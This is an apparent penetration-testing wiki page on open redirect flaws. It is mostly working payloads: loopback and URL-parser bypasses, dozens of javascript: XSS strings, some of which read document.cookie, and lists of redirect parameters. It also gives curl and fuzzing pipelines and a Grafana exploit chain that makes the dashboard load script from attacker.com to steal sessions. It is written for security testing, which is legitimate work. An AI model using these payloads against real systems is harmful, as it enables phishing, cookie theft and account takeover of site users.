# Open Redirect

{{#include ../banners/hacktricks-training.md}}


## Open redirect

### Redirect to localhost or arbitrary domains

- If the app “allows only internal/whitelisted hosts”, try alternative host notations to hit loopback or internal ranges via the redirect target:
  - IPv4 loopback variants: 127.0.0.1, 127.1, 2130706433 (decimal), 0x7f000001 (hex), 017700000001 (octal)
  - IPv6 loopback variants: [::1], [0:0:0:0:0:0:0:1], [::ffff:127.0.0.1]
  - Trailing dot and casing: localhost., LOCALHOST, 127.0.0.1.
  - Wildcard DNS that resolves to loopback: lvh.me, sslip.io (e.g., 127.0.0.1.sslip.io), traefik.me, localtest.me. These are useful when only “subdomains of X” are allowed but host resolution still points to 127.0.0.1.
- Network-path references often bypass naive validators that prepend a scheme or only check prefixes:
  - //attacker.tld → interpreted as scheme-relative and navigates off-site with the current scheme.
- Userinfo tricks defeat contains/startswith checks against trusted hosts:
  - https://trusted.tld@attacker.tld/ → browser navigates to attacker.tld but simple string checks “see” trusted.tld.
- Backslash parsing confusion between frameworks/browsers:
  - https://trusted.tld\@attacker.tld → some backends treat “\” as a path char and pass validation; browsers normalize to “/” and interpret trusted.tld as userinfo, sending users to attacker.tld. This also appears in Node/PHP URL-parser mismatches.

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

### Modern open-redirect to XSS pivots

```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

# Abuse bad subdomain filter
javascript://sub.domain.com/%0Aalert(1)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```

<details>
<summary>More modern URL-based bypass payloads</summary>

```text
# Scheme-relative (current scheme is reused)
//evil.example

# Credentials (userinfo) trick
https://trusted.example@evil.example/

# Backslash confusion (server validates, browser normalizes)
https://trusted.example\@evil.example/

# Schemeless with whitespace/control chars
evil.example%00
%09//evil.example

# Prefix/suffix matching flaws
https://trusted.example.evil.example/
https://evil.example/trusted.example

# When only path is accepted, try breaking absolute URL detection
/\\evil.example
/..//evil.example
```
</details>

## Open Redirect uploading svg files

```html
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```

## Common injection parameters

```text
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```

## Code examples

#### .Net

```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```

#### Java

```bash
response.redirect("http://mysafedomain.com");
```

#### PHP

```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```

## Hunting and exploitation workflow (practical)

- Single URL check with curl:

```bash
curl -s -I "https://target.tld/redirect?url=//evil.example" | grep -i "^Location:"
```

- Discover and fuzz likely parameters at scale:

<details>
<summary>Click to expand</summary>

```bash
# 1) Gather historical URLs, keep those with common redirect params
cat domains.txt \
  | gau --o urls.txt            # or: waybackurls / katana / hakrawler

# 2) Grep common parameters and normalize list
rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=)" urls.txt \
  | sed 's/\r$//' | sort -u > candidates.txt

# 3) Use OpenRedireX to fuzz with payload corpus
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt

# 4) Manually verify interesting hits
awk '/30[1237]|Location:/I' results.txt
```
</details>

- Don’t forget client-side sinks in SPAs: look for window.location/assign/replace and framework helpers that read query/hash and redirect.

- Frameworks often introduce footguns when redirect destinations are derived from untrusted input (query params, Referer, cookies). See Next.js notes about redirects and avoid dynamic destinations derived from user input.

{{#ref}}
../network-services-pentesting/pentesting-web/nextjs.md
{{#endref}}

- OAuth/OIDC flows: abusing open redirectors frequently escalates to account takeover by leaking authorization codes/tokens. See dedicated guide:

{{#ref}}
./oauth-to-account-takeover.md
{{#endref}}

- Server responses that implement redirects without Location (meta refresh/JavaScript) are still exploitable for phishing and can sometimes be chained. Grep for:

```html
<meta http-equiv="refresh" content="0;url=//evil.example">
<script>location = new URLSearchParams(location.search).get('next')</script>
```

### Fragment smuggling + client-side traversal chain (Grafana-style bypass)

- **Server-side gap (Go `url.Parse` + raw redirect)**: validators that only inspect `URL.Path` and ignore `URL.Fragment` can be tricked by placing the external host after `#`. If the handler later builds `Location` from the *unsanitized* string, fragments leak back into the redirect target. Example against `/user/auth-tokens/rotate`:
  - Request: `GET /user/auth-tokens/rotate?redirectTo=/%23/..//\//attacker.com HTTP/1.1`
  - Parsing sees `Path=/` and `Fragment=/..//\//attacker.com`, so regex + `path.Clean()` approve `/`, but the response emits `Location: /\//attacker.com`, acting as an open redirect.
- **Client-side gap (validate decoded/cleaned, return original)**: SPA helpers that fully decode a path (including double-encoded `?`), strip the query for validation, but then return the *original* string let encoded `../` survive. Browser decoding later turns it into a traversal to any same-origin endpoint (e.g., the redirect gadget). Payload pattern:
  - `/dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser/auth-tokens/rotate`
  - The validator checks `/dashboard/script/` (no `..`), returns the encoded string, and the browser walks to `/user/auth-tokens/rotate`.
- **End-to-end XSS/ATO**: chain the traversal with the fragment-smuggled redirect to coerce the dashboard script loader into fetching attacker JS:

```text
https://<grafana>/dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser%2fauth-tokens%2frotate%3fredirectTo%3d%2f%2523%2f..%2f%2f%5c%2fattacker.com%2fmodule.js
```

  - The path traversal reaches the rotate endpoint, which issues a 302 to `attacker.com/module.js` from the fragment-smuggled `redirectTo`. Ensure the attacker origin serves JS with permissive CORS so the browser executes it, yielding session theft/account takeover.

## Tools

- [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)
- OpenRedireX – fuzzer for detecting open redirects. Example:

```bash
# Install
git clone https://github.com/devanshbatham/OpenRedireX && cd OpenRedireX && ./setup.sh

# Fuzz a list of candidate URLs (use FUZZ as placeholder)
cat list_of_urls.txt | ./openredirex.py -p payloads.txt -k FUZZ -c 50
```

## References

- In https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect you can find fuzzing lists.
- [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
- [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)
- PortSwigger Web Security Academy – DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- OpenRedireX – A fuzzer for detecting open redirect vulnerabilities: https://github.com/devanshbatham/OpenRedireX
- [Grafana CVE-2025-6023 redirect + traversal bypass chain](https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive)

{{#include ../banners/hacktricks-training.md}}
